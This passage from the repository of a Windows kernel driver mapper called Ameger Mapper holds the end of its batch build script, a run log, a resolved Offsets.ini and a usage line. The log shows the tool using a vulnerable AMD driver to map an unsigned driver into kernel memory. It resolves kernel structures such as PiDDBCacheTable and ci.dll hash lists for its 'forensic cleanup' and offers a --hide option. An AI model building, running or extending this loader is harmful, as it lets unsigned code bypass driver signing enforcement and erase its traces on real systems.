if defined SDK_VERSION set "SDK_ARG=/p:WindowsTargetPlatformVersion=%SDK_VERSION%"
echo   %C_GREEN%[+]%C_RESET% MSBuild: %C_GREEN%%MSBUILD%%C_RESET%
if defined TOOLSET echo   %C_GREEN%[+]%C_RESET% Platform toolset: %C_GREEN%%TOOLSET%%C_RESET%
if defined SDK_VERSION echo   %C_GREEN%[+]%C_RESET% Windows SDK: %C_GREEN%%SDK_VERSION%%C_RESET%
echo.
echo.

echo [%C_GREEN%2%C_RESET%/%C_GREEN%6%C_RESET%] Checking projects...
echo.
if not exist "%SLN%" goto :source_error
if not exist "%MAPPER_PROJ%" goto :source_error
if not exist "%SYMBOLTOOL_PROJ%" goto :source_error
echo   %C_GREEN%[+]%C_RESET% Solution, Mapper and SymbolTool projects present.
echo.
findstr /i /c:"PDB_OFFSETS" "%MAPPER_PROJ%" >nul 2>&1
if errorlevel 1 goto :source_error
if not exist "%DBGHELP_SRC%\dbghelp.dll" goto :source_error
if not exist "%DBGHELP_SRC%\symsrv.dll" goto :source_error
echo   %C_GREEN%[+]%C_RESET% %C_GREEN%PDB_OFFSETS%C_RESET% is defined in the Mapper project.
echo   %C_GREEN%[+]%C_RESET% Symbol libraries present in %C_GREEN%%DBGHELP_SRC%%C_RESET%.
echo.
echo.

echo [%C_GREEN%3%C_RESET%/%C_GREEN%6%C_RESET%] Cleaning Release, build scratch, x64 and Intermediate...
echo.
rem Every one of these is wiped rather than incrementally cleaned: a stale
rem object or a stale PDB in the release folder is a build fingerprint, and an
rem incremental build can silently reuse one. Nothing in the release root is
rem preserved anymore: the flat symbol store used to live in Release\Symbols
rem and had to survive this wipe, but it has moved up to Build\Symbols, which no
rem stage of this script touches, so the release root is wiped outright.
rem
rem Mapper\x64, Mapper\Intermediate, and the two folders one level up at the
rem repository root are all cleaned here even though stage 4 no longer writes to
rem them. They are the shapes earlier project layouts produced, and leaving them
rem removes nothing from the shipped release but does mean the source tree keeps
rem artifacts from builds made before the output moved out of the tree.
call :clean_directory "%OUT_ROOT%"
if errorlevel 1 goto :clean_error
call :clean_directory "%SCRATCH%"
if errorlevel 1 goto :clean_error
call :clean_directory "%BUILD_DIR%\obj"
if errorlevel 1 goto :clean_error
call :clean_directory "%SOURCE_ROOT%\x64"
if errorlevel 1 goto :clean_error
call :clean_directory "%SOURCE_ROOT%\Intermediate"
if errorlevel 1 goto :clean_error
call :clean_directory "%ROOT%\x64"
if errorlevel 1 goto :clean_error
call :clean_directory "%ROOT%\Intermediate"
if errorlevel 1 goto :clean_error
call :prepare_scratch
if errorlevel 1 goto :clean_error
echo   %C_GREEN%[+]%C_RESET% Clean layout prepared in: %C_GREEN%%OUT_ROOT%%C_RESET%.
echo.
echo.

echo [%C_GREEN%4%C_RESET%/%C_GREEN%6%C_RESET%] Building Mapper...
echo.
call :build_solution
if errorlevel 1 goto :build_error
echo.
echo   %C_GREEN%[+]%C_RESET% Native output: %C_GREEN%%NATIVE_OUT%%C_RESET%
echo.

echo [%C_GREEN%5%C_RESET%/%C_GREEN%6%C_RESET%] Deploying release...
echo.
call :deploy_binaries
if errorlevel 1 goto :deploy_error
call :sweep_artifacts
if errorlevel 1 goto :cleanup_error
call :verify_release
if errorlevel 1 goto :verify_error
echo.
echo   %C_GREEN%[+]%C_RESET% Release staged in %C_GREEN%%OUT_ROOT%%C_RESET%.
echo.
echo.

echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Resolving and verifying offsets...
echo.
call :resolve_offsets
if errorlevel 1 goto :offsets_error
rem SymbolTool caches the PDBs it resolves in Build\Symbols as a flat store
rem (Build\Symbols\ntkrnlmp.pdb, not the nested symstore layout). It sits
rem outside the release root on purpose, so stage 3's wipe of the release never
rem discards it; SymbolTool resolves against the cache and only re-downloads
rem a PDB that is missing or does not match the running build.
echo.

echo Build completed successfully.
echo.
echo Release:  %C_GREEN%%OUT_ROOT%%C_RESET%
echo Mapper:   %C_GREEN%%OUT_ROOT%\Mapper.exe%C_RESET%
echo Offsets:  %C_GREEN%%OUT_ROOT%\Offsets.ini%C_RESET%
echo Tool:     %C_GREEN%%OUT_ROOT%\SymbolTool.exe%C_RESET%

echo.

if "%NO_PAUSE%"=="0" pause
exit /b 0

rem ---------------------------------------------------------------------------
rem Stages
rem ---------------------------------------------------------------------------

:build_solution
rem Build the solution exactly as the projects define it. A full Rebuild is
rem used rather than an incremental Build because stage 3 already wiped the
rem native output and intermediates, so this cannot silently skip a project.
echo   %C_GREEN%Building%C_RESET% %SLN% %C_RED%(%PLATFORM_NAME%)%C_RESET%
rem No /p:OutDir or /p:IntDir here: the projects already resolve both into
rem %TEMP%\amager_build, and a global override would give the two projects one
rem shared intermediate folder. The Mapper post-build copies the two symbol
rem libraries into $(OutDir)\DLLs, so it follows the output automatically.
rem IgnoreWarnIntDirInTempDetected silences MSB8029, which VCMessage raises
rem because OutDir/IntDir live under the temporary directory. That is deliberate
rem here (the scratch must stay out of the source tree) and the warning's
rem incremental-build concern cannot apply - every build is a full /t:Rebuild
rem against a scratch stage 3 wiped, so nothing stale is reused. This is the
rem documented property for the check; /nowarn does not suppress it because
rem VCMessage bypasses the normal warning filter.
"%MSBUILD%" "%SLN%" /nologo /m /nodeReuse:false /v:minimal /t:Rebuild /p:IgnoreWarnIntDirInTempDetected=true /p:Configuration=%CONFIG_NAME% /p:Platform=%PLATFORM_NAME% %TOOLSET_ARG% %SDK_ARG% > "%BUILD_LOG%" 2>&1
if errorlevel 1 (
  echo   %C_RED%ERROR: build failed. Last 40 lines of %BUILD_LOG%%C_RESET%
  powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "Get-Content -Tail 40 -LiteralPath '%BUILD_LOG%'"
  exit /b 1
)
exit /b 0

:deploy_binaries
rem Stage what the release is made of: the two binaries at the release root and
rem the dbghelp pair under DLLs\. Fail closed on each - a release missing any of
rem them cannot run, because Mapper.exe resolves SymbolTool.exe, Offsets.ini and
rem the dbghelp pair relative to its own folder.
call :stage "%NATIVE_OUT%\SymbolTool.exe" "%OUT_ROOT%\SymbolTool.exe"
if errorlevel 1 exit /b 1
if not exist "%DLL_DIR%" mkdir "%DLL_DIR%"
if not exist "%DLL_DIR%" exit /b 1
call :stage "%DBGHELP_SRC%\dbghelp.dll" "%DLL_DIR%\dbghelp.dll"
if errorlevel 1 exit /b 1
call :stage "%NATIVE_OUT%\Mapper.exe"   "%OUT_ROOT%\Mapper.exe"
if errorlevel 1 exit /b 1
call :stage "%DBGHELP_SRC%\symsrv.dll" "%DLL_DIR%\symsrv.dll"
if errorlevel 1 exit /b 1
echo.
exit /b 0

:stage
rem %~1 = source, %~2 = destination path.
copy /y "%~1" "%~2" >nul
if errorlevel 1 (
  echo   %C_RED%ERROR: unable to deploy %~2%C_RESET%
  exit /b 1
)
rem A zero or truncated copy is worse than a missing one: MSBuild can report
rem success while an output was never written, and a 0-byte Mapper.exe would
rem still "exist" for every later existence check.
for %%A in ("%~2") do if %%~zA LSS 1024 (
  echo   %C_RED%ERROR: deployed %~2 is implausibly small ^(%%~zA bytes^).%C_RESET%
  exit /b 1
)
rem Digest recorded in the build log so a shipped release can be traced back to
rem the file that produced it.
set "STAGE_SHA="
for /f "usebackq tokens=1,2 delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$h=([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([IO.File]::ReadAllBytes('%~2'))) -replace '-',''); Write-Output ('STAGE_SHA=' + $h)"`) do set "%%A=%%B"
if not defined STAGE_SHA (
  echo   %C_RED%ERROR: unable to hash %~2%C_RESET%
  exit /b 1
)
for %%F in ("%~2") do echo   %C_GREEN%[+]%C_RESET% %%~nxF     %C_GREEN%%STAGE_SHA%%C_RESET%
set "STAGE_SHA="
exit /b 0

:sweep_artifacts
rem Move build PDBs out of the release folder into the temp scratch. A build PDB
rem records the absolute source paths and the symbol names of the machine that
rem produced it, which is not something a shipped release should carry. Set
rem AMEGER_KEEP_PDB=1 to keep them for debugging.
rem
rem The symbol store is not touched here: it lives in Build\Symbols, outside
rem the release root, and is a flat cache that SymbolTool resolves against,
rem not a build artifact.
if not exist "%SCRATCH%" exit /b 0
set "SWEEP_FAILED="
if /i not "%AMEGER_KEEP_PDB%"=="1" (
  rem Sweep every .pdb rather than a hardcoded name: both projects emit one and
  rem a name-matched sweep silently misses whichever was renamed.
  for %%F in ("%OUT_ROOT%\*.pdb") do if exist "%%~F" (
    move /y "%%~F" "%SCRATCH%\" >nul
    if exist "%%~F" set "SWEEP_FAILED=1"
  )
) else (
  echo   %C_YELLOW%[!]%C_RESET% PDB sweep skipped ^(AMEGER_KEEP_PDB=1^).
)
if defined SWEEP_FAILED exit /b 1
exit /b 0

:verify_release
rem Prove each shipped artifact is present and is a PE image, not just a file
rem that happens to exist. The MZ check is what catches a release folder that
rem picked up a text file under the right name.
call :verify_pe "%OUT_ROOT%\Mapper.exe" "Mapper.exe"
if errorlevel 1 exit /b 1
call :verify_pe "%OUT_ROOT%\SymbolTool.exe" "SymbolTool.exe"
if errorlevel 1 exit /b 1
call :verify_pe "%DLL_DIR%\symsrv.dll" "DLLs\symsrv.dll"
if errorlevel 1 exit /b 1
call :verify_pe "%DLL_DIR%\dbghelp.dll" "DLLs\dbghelp.dll"
if errorlevel 1 exit /b 1
exit /b 0

:verify_pe
rem %~1 = path, %~2 = label.
if not exist "%~1" (
  echo   %C_RED%ERROR: %~2 is missing from the release folder.%C_RESET%
  exit /b 1
)
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllBytes('%~1'); if($b.Length -lt 2 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A){exit 1}"
if errorlevel 1 (
  echo   %C_RED%ERROR: %~2 is not a PE image.%C_RESET%
  exit /b 1
)
echo   %C_GREEN%OK%C_RESET% %~2: %C_GREEN%"%~1"%C_RESET%
exit /b 0

:resolve_offsets
rem Run the freshly staged SymbolTool.exe to produce Offsets.ini.
rem
rem It must run from the release folder: it writes Offsets.ini next to its own
rem executable and caches downloaded PDBs in Build\Symbols, one level above it.
rem Running the native copy instead would write Offsets.ini into the build
rem tree, where the shipped Mapper.exe would never look for it.
set "OFFSETS_PATH=%OUT_ROOT%\Offsets.ini"
del /f /q "%OFFSETS_PATH%" >nul 2>&1
rem SymbolTool.exe imports dbghelp.dll and dbghelp loads symsrv.dll itself. Both
rem now live in the DLLs subfolder, which is not a default DLL search location,
rem so it is put on PATH for this invocation. Mapper.exe does the same for the
rem copy it spawns at run time (see SymbolsHandler::ReloadFile).
set "OLD_PATH=%PATH%"
set "PATH=%DLL_DIR%;%PATH%"
pushd "%OUT_ROOT%"
"%OUT_ROOT%\SymbolTool.exe"
set "RESOLVE_STATUS=%ERRORLEVEL%"
popd
set "PATH=%OLD_PATH%"
set "OLD_PATH="
if not "%RESOLVE_STATUS%"=="0" (
  echo   %C_RED%ERROR: SymbolTool.exe exited with %RESOLVE_STATUS%.%C_RESET%
  exit /b 1
)
if not exist "%OFFSETS_PATH%" (
  echo   %C_RED%ERROR: SymbolTool.exe produced no Offsets.ini.%C_RESET%
  exit /b 1
)
call :verify_offsets
if errorlevel 1 exit /b 1
exit /b 0

:verify_offsets
rem Check that Offsets.ini actually carries what the mapper reads at run time.
rem
rem PowerShell is used rather than findstr because the scan reports every missing
rem key and the total entry count in one pass. The file itself is single-byte
rem ASCII (SymbolTool's wide stream narrows to one byte per character), not UTF-16LE.
rem
rem Mandatory entries are the ones Driver::Load and the cleanup walks treat as
rem required; a missing one means the mapper runs against a compiled-in default
rem rather than this build. AMEGER_ALLOW_MISSING_OFFSETS=1 downgrades that to a
rem warning for a build where the symbols genuinely are not published.
set "REQUIRED_SYMBOLS=PiDDBLock;PiDDBCacheTable;MmAllocateIndependentPagesEx;MmFreeIndependentPages;MmSetPageProtection;g_KernelHashBucketList;g_HashCacheLock"
set "REQUIRED_FIELDS=_FILE_OBJECT.DeviceObject;_DEVICE_OBJECT.DriverObject;_DRIVER_OBJECT.DriverSection;_KLDR_DATA_TABLE_ENTRY.BaseDllName;_RTL_AVL_TABLE.DeleteCount"
set "OFFSETS_MISSING="
set "OFFSETS_TOTAL="
set "OFFSETS_ANYMISSING=0"
rem PowerShell prints one line per finding and batch echoes the misses from
rem inside this single loop. The earlier form split the joined list back out
rem with a FOR over a quoted string, which iterates one item rather than a
rem list and ended in a path-operator error.
rem No regex is used below: carets and pipes inside a for /f backtick command
rem have to be escaped for cmd, and a plain line scan avoids that entirely.
for /f "usebackq tokens=1,* delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$lines=Get-Content -LiteralPath '%OFFSETS_PATH%'; $keys=('%REQUIRED_SYMBOLS%;%REQUIRED_FIELDS%' -split ';'); $miss=@(); foreach($k in $keys){ if(-not ($lines -match ('^'+[regex]::Escape($k)+'='))){ $miss+=$k } }; Write-Output ('OFFSETS_TOTAL=' + ($lines -match '=').Count); Write-Output ('OFFSETS_ANYMISSING=' + $miss.Count); foreach($m in $miss){ Write-Output ('OFFSETS_MISSING=' + $m) }"`) do (
  if "%%A"=="OFFSETS_TOTAL" set "OFFSETS_TOTAL=%%B"
  if "%%A"=="OFFSETS_ANYMISSING" set "OFFSETS_ANYMISSING=%%B"
  rem Printed uncoloured on purpose: chaining "%C_YELLOW%%B%C_RESET%" here makes
  rem the for variable and the percent expansion consume each other's text, and
  rem the key prints as literal "C_RESET" instead of its value.
  if "%%A"=="OFFSETS_MISSING" echo         %%B
)
if not defined OFFSETS_TOTAL goto :offsets_error
if "%OFFSETS_TOTAL%"=="0" (
  echo   %C_RED%ERROR: Offsets.ini contains no entries.%C_RESET%
  exit /b 1
)
if "%OFFSETS_ANYMISSING%"=="0" goto :offsets_ok
if /i "%AMEGER_ALLOW_MISSING_OFFSETS%"=="1" (
  echo   %C_YELLOW%[!]%C_RESET% Unresolved offsets above ^(AMEGER_ALLOW_MISSING_OFFSETS=1^); the mapper will fall back to compiled-in offsets.
) else (
  echo   %C_RED%ERROR: Offsets.ini is missing the required entries listed above; the mapper would fall back to compiled-in offsets.%C_RESET%
  exit /b 1
)
:offsets_ok
echo   %C_GREEN%[+]%C_RESET% Offsets.ini carries %C_GREEN%%OFFSETS_TOTAL%%C_RESET% entries.
exit /b 0
rem Helpers
rem ---------------------------------------------------------------------------

:find_msbuild
if exist "%VSWHERE%" for /f "usebackq delims=" %%M in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -find "MSBuild\**\Bin\MSBuild.exe" 2^>nul`) do if not defined MSBUILD if exist "%%M" set "MSBUILD=%%M"
if defined MSBUILD exit /b 0
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if defined MSBUILD exit /b 0
for /f "delims=" %%M in ('where msbuild.exe 2^>nul') do if not defined MSBUILD set "MSBUILD=%%M"
if defined MSBUILD exit /b 0
exit /b 1

:select_toolset
rem Read the toolset the project actually pins instead of guessing it from the
rem Visual Studio version. The vcxproj is the authority: passing /p:PlatformToolset
rem for a toolset the project does not pin downgrades the build instead of
rem building what ships. Falls back to the VS major version when the project
rem carries no explicit PlatformToolset.
if defined AMEGER_PLATFORM_TOOLSET (
  set "TOOLSET=%AMEGER_PLATFORM_TOOLSET%"
  exit /b 0
)
set "TOOLSET="
for /f "usebackq tokens=2 delims=<>" %%T in (`findstr /i /r /c:"PlatformToolset^>v[0-9]*" "%MAPPER_PROJ%" 2^>nul`) do if not defined TOOLSET set "TOOLSET=%%T"
if defined TOOLSET exit /b 0
if not exist "%VSWHERE%" exit /b 0
set "VS_VERSION="
for /f "usebackq delims=" %%V in (`"%VSWHERE%" -latest -products * -property installationVersion 2^>nul`) do if not defined VS_VERSION set "VS_VERSION=%%V"
if not defined VS_VERSION exit /b 0
for /f "tokens=1 delims=." %%V in ("%VS_VERSION%") do set "VS_MAJOR=%%V"
if "%VS_MAJOR%"=="18" set "TOOLSET=v145"
if "%VS_MAJOR%"=="17" set "TOOLSET=v143"
if defined TOOLSET exit /b 0
exit /b 1

:clean_directory
if exist "%~1" rmdir /s /q "%~1"
if exist "%~1" exit /b 1
exit /b 0

:prepare_scratch
rem Scratch root outside the source tree. bin\ holds the native build output
rem before staging and obj\ the MSBuild intermediates; both live under %TEMP%,
rem so the repository never grows a build folder.
if not exist "%OUT_ROOT%" mkdir "%OUT_ROOT%"
if not exist "%SCRATCH%" mkdir "%SCRATCH%"
if not exist "%NATIVE_OUT%" mkdir "%NATIVE_OUT%"
if not exist "%NATIVE_INT%" mkdir "%NATIVE_INT%"
if not exist "%OUT_ROOT%" exit /b 1
if not exist "%SCRATCH%" exit /b 1
if not exist "%NATIVE_OUT%" exit /b 1
if not exist "%NATIVE_INT%" exit /b 1
exit /b 0

rem ---------------------------------------------------------------------------
rem Failure paths. Every one funnels through :failure so there is a single
rem exit point and a single place that pauses.
rem ---------------------------------------------------------------------------

:msbuild_error
echo %C_RED%ERROR: MSBuild was not found.%C_RESET%
goto :failure

:toolset_error
echo %C_RED%ERROR: unable to determine a platform toolset for %MAPPER_PROJ%.%C_RESET%
echo %C_RED%ERROR: set AMEGER_PLATFORM_TOOLSET explicitly and re-run.%C_RESET%
goto :failure

:source_error
echo %C_RED%ERROR: one or more required project files or symbol libraries are missing.%C_RESET%
goto :failure

:clean_error
echo %C_RED%ERROR: unable to prepare the release or build scratch directory.%C_RESET%
goto :failure

:build_error
echo %C_RED%ERROR: a project build failed; see %BUILD_LOG%.%C_RESET%
goto :failure

:deploy_error
echo %C_RED%ERROR: unable to deploy the release binaries.%C_RESET%
goto :failure

:verify_error
echo %C_RED%ERROR: one or more expected binaries are missing or are not PE images.%C_RESET%
goto :failure

:offsets_error
echo %C_RED%ERROR: Offsets.ini is missing, empty or incomplete.%C_RESET%
goto :failure

:cleanup_error
echo %C_RED%ERROR: unable to remove generated build artifacts from the release folder.%C_RESET%
goto :failure

:failure
if "%NO_PAUSE%"=="0" pause
exit /b 1
```

### D:\Ameger\Mapper\Build\Release\mapper_debug.log â€” 61 lines â€” sha12:1B65541ABAB6
```log
  [!] WARNING: --free is unsafe for drivers that keep running after DriverEntry returns.
  [!] Freeing as requested because --force-free was given.
  [+] Free memory after driver execution enabled
  [+] Injector PID for the AMGParamBlock patch (injector-side, see AmgClientPatchImage): 16320
  [+] Forensic cleanup disabled (--no-forensics)
  [+] File:         [92mAmegerStub.patched.sys[0m
  [+] Path:         [92mD:\Ameger\Injector\Driver\Build\Output\AmegerStub.patched.sys[0m
  [+] Size:         [92m17,408 Bytes (17.00 KB)[0m
  [+] SHA-256:      [92m9c3778c9846f488431a2c8db4c222479356ae4c8db1c6ddbcc1f487f0c5e7cd3[0m
  [+] Architecture: [92mx64[0m
  [+] Subsystem:    [92mNative[0m
  [+] Image base:   [92m0x0000000180000000[0m
  [+] Entry point:  [92m0x1ec0[0m
  [+] Sections:     [92m.text fothk .rdata .data .pdata .edata INIT .reloc[0m
  [+] Relocations:  [92mPresent[0m
  [+] Signature:    [92mUnsigned[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mMmAllocateIndependentPagesEx[0m | Offset = [92m0xaa0cfc[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mMmFreeIndependentPages[0m | Offset = [92m0x2a2510[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mMmSetPageProtection[0m | Offset = [92m0x4e1580[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mPiDDBCacheTable[0m | Offset = [92m0xfda490[0m
  [+] Loaded [92mci.dll[0m | [92mg_KernelHashBucketList[0m | Offset = [92m0xec090[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mPiDDBLock[0m | Offset = [92m0xf8c280[0m
  [+] Loaded [92mntoskrnl.exe[0m | [92mMmPteBase[0m | Offset = [92m0xfc54c8[0m
  [+] Loaded [92mci.dll[0m | [92mg_HashCacheLock[0m | Offset = [92m0x460c0[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_KLDR_DATA_TABLE_ENTRY.BaseDllName[0m | Offset = [92m0x58[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.DriverExtension[0m | Offset = [92m0x30[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_EXTENSION.DriverObject[0m | Offset = [92m0x0[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.DriverSection[0m | Offset = [92m0x28[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.DriverUnload[0m | Offset = [92m0x68[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DEVICE_OBJECT.DriverObject[0m | Offset = [92m0x8[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_RTL_AVL_TABLE.DeleteCount[0m | Offset = [92m0x40[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.DriverStart[0m | Offset = [92m0x18[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.DriverSize[0m | Offset = [92m0x20[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_FILE_OBJECT.DeviceObject[0m | Offset = [92m0x8[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.Flags[0m | Offset = [92m0x10[0m
  [+] Loaded [92mntoskrnl.exe.fields[0m | [92m_DRIVER_OBJECT.Size[0m | Offset = [92m0x2[0m
  [+] Loaded [92m20[0m Offsets ([92m8[0m Symbols, [92m12[0m Fields) From [92mD:\Ameger\Mapper\Build\Release\Offsets.ini[0m
  [!] Using vulnerable driver provider: [92mAMD PdFwKrnl[0m, Device: [92m\\.\PdFwKrnl[0m
  [+] Provider driver is already loaded, reusing the existing instance (no artifacts will be created)
  [+] Structure offsets resolved from symbols for this build ([92m5[0m/[92m5[0m)
  [+] nt!MmPteBase holds [92m0xfffffd8000000000[0m
  [+] Kernel PTE self-map verified: PTE base = [92m0xfffffd8000000000[0m | PDE base = [92m0xfffffdfec0000000[0m | KUSER_SHARED_DATA 4K Leaf [92mOK[0m | ntoskrnl [92m2MB Leaf[0m OK
  [INFO] KUSER_SHARED_DATA PTE = [92m0x8a00000000282121[0m | Present = [92m1[0m | RW = [92m0[0m | User = [92m0[0m | Large = [92m0[0m | PFN = [92m0x282[0m | Addr = [92m0xfffffdfbc0000000[0m
  [INFO] ntoskrnl base PDE = [92m0x8a000001002001a1[0m | Present = [92m1[0m | RW = [92m0[0m | User = [92m0[0m | Large = [92m1[0m | PFN = [92m0x100200[0m | Addr = [92m0xfffffdfefe00eac8[0m
  [INFO] KUSER_SHARED_DATA Dual-Map | KernelPFN = [92m0x282[0m | UserPFN = [92m0x282[0m | UserAddr = [92m0xfffffd80003fff00[0m | PFNMatch = [92mYes[0m
  [INFO] Self-Map Summary | KUSER_SHARED_DATA 4K [92mOK[0m | Dual-Map PFN [92mMatch[0m | ntoskrnl [92m2MB Leaf[0m
  [*] Provider reused from a prior load, forensic cleanup skipped (provider name differs from this run)
  [+] Image base has been allocated at [92m0xffff808075f5d000[0m
  [INFO] Skipped [92m0x1000[0m Bytes of PE Header
  [+] Fixing stack cookie
  [+] DriverObject Built At [92m0xffff9688085037c0[0m | Extension [92m0xffff968808503740[0m | Size [92m0x150[0m | Start [92m0xffff808075f5d000[0m | Image Size [92m0x9000[0m | Fields From Symbols [92m7[0m/[92m7[0m
  [!] Calling DriverEntry | Entry [92m0xffff808075f5dec0[0m | DriverEntry ([92m18446628109732034496[0m, [92m11337728[0m)
  [+] DriverEntry returned: [92m0xc0000001[0m
  [+] Freeing memory
  [+] Memory has been released
  [+] Image released (--free); only the driver object at [92m0xffff9688085037c0[0m remains, which the loaded driver still references
  [+] Executable span kept mapped: RVA [92m0x1000[0m, size [92m0x718a[0m, resident [92m0xffff808075f5d000[0m
  [!] Unloading vulnerable driver
  [-] "[92mAmegerStub.patched.sys[0m" was mapped, but DriverEntry returned [92m0xc0000001[0m ([92mSTATUS_UNSUCCESSFUL[0m).
  [-] The image is left resident, but the driver reported failure and may not be usable.
  Press Enter to exit...

```

### D:\Ameger\Mapper\Build\Release\Offsets.ini â€” 24 lines â€” sha12:2D6978CBBF40
```ini
[ntoskrnl.exe]
MmAllocateIndependentPagesEx=11144444
MmFreeIndependentPages=2762000
PiDDBLock=16302720
PiDDBCacheTable=16622736
MmSetPageProtection=5117312
MmPteBase=16536776
[ntoskrnl.exe.fields]
_FILE_OBJECT.DeviceObject=8
_DEVICE_OBJECT.DriverObject=8
_DRIVER_OBJECT.DriverSection=40
_KLDR_DATA_TABLE_ENTRY.BaseDllName=88
_RTL_AVL_TABLE.DeleteCount=64
_DRIVER_OBJECT.Size=2
_DRIVER_OBJECT.DriverStart=24
_DRIVER_OBJECT.DriverSize=32
_DRIVER_OBJECT.DriverExtension=48
_DRIVER_OBJECT.Flags=16
_DRIVER_OBJECT.DriverUnload=104
_DRIVER_EXTENSION.DriverObject=0

[ci.dll]
g_KernelHashBucketList=966800
g_HashCacheLock=286912
[ci.dll.fields]


```

### D:\Ameger\Mapper\Build\Release\write_test.txt â€” 1 lines â€” sha12:34924D30A7D8
```text
WRITETEST

```

### D:\Ameger\Mapper\Build\Releasemapper_debug.log â€” 4 lines â€” sha12:82D6A06D38FA
```log
[DBG] wmain entered
[+] Usage: Mapper.exe [--free [--force-free]][--indPages][--PassAllocationPtr][--copy-header][--hide][--no-forensics][--dontUpdateOffsets [--offsetsPath "FilePath"]] [driver.sys]
[+] Run with no driver path to be prompted for one interactively.
  Press Enter to exit...

```

### D:\Ameger\Mapper\Build\Symbols\pingme.txt â€” 0 lines â€” sha12:E3B0C44298FC
```text
```

### D:\Ameger\Mapper\Mapper\App\AmgSharedApp.h â€” 75 lines â€” sha12:867284FBC20D
```c-header
/*
 * AmgSharedApp.h
 * User-mode mirror of the AmgerStub driver's AmgShared.h block layout.
 *
 * The injector (Mapper App) allocates an AMG_SHARED_BLOCK in user memory, sets the
 * control block magic + version and the log ring capacity, and passes its VA to
 * DriverEntry as param2. The field order and types match the driver's AmgShared.h
 * exactly so the kernel-side validation and writes line up.
 */
#ifndef AMG_SHARED_APP_H
#define AMG_SHARED_APP_H

#include <stdint.h>

typedef uint32_t u32;
typedef uint16_t u16;
typedef uint64_t u64;

/* Must match the driver's AMG_SHARED_MAGIC. */
#define AMG_SHARED_MAGIC 1128746305

typedef struct AMG_SHARED_CONTROL_BLOCK
{
    u32 magic;
    u16 version;
    u32 buildNumber;
    u32 hvciState;
    u32 flags;
